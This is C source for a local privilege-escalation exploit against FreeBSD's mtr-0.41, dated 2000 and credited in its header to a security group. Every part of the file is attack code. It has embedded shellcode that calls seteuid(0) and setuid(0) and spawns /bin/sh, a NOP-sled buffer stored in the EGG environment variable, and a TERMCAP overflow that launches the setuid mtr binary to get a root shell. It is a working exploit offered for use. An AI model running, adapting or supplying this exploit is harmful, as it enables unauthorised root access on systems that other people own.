/* (c) 2000 babcia padlina / buffer0verfl0w security (www.b0f.com) */
/* freebsd mtr-0.41 local root exploit */

#include <stdio.h>
#include <sys/param.h>
#include <sys/stat.h> 
#include <string.h>   

#define NOP             0x90
#define BUFSIZE         10000
#define ADDRS           1200 

long getesp(void)
{
   __asm__("movl %esp, %eax\n");
}

int main(argc, argv)
int argc; 
char **argv;
{
        char *execshell =
        //seteuid(0);
        "\x31\xdb\xb8\xb7\xaa\xaa\xaa\x25\xb7\x55\x55\x55\x53\x53\xcd\x80"
        //setuid(0);
        "\x31\xdb\xb8\x17\xaa\xaa\xaa\x25\x17\x55\x55\x55\x53\x53\xcd\x80"
        //execl("/bin/sh", "sh", 0);
        "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
        "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
        "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
        "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";

        char buf[BUFSIZE+ADDRS+1], *p;
        int noplen, i, ofs;
        long ret, *ap;
   
        if (argc < 2) { fprintf(stderr, "usage: %s ofs\n", argv[0]); exit(0); }

        ofs = atoi(argv[1]);

        noplen = BUFSIZE - strlen(execshell);
        ret = getesp() + ofs;
        
        memset(buf, NOP, noplen);
        buf[noplen+1] = '\0';
        strcat(buf, execshell);
        
        setenv("EGG", buf, 1);
        
        p = buf;
        ap = (unsigned long *)p;
        
        for(i = 0; i < ADDRS / 4; i++)
                *ap++ = ret;
        
        p = (char *)ap;
        *p = '\0';
        
        fprintf(stderr, "ret: 0x%x\n", ret);
        
        setenv("TERMCAP", buf, 1);
        execl("/usr/local/sbin/mtr", "mtr", 0);
        
        return 0;
}       
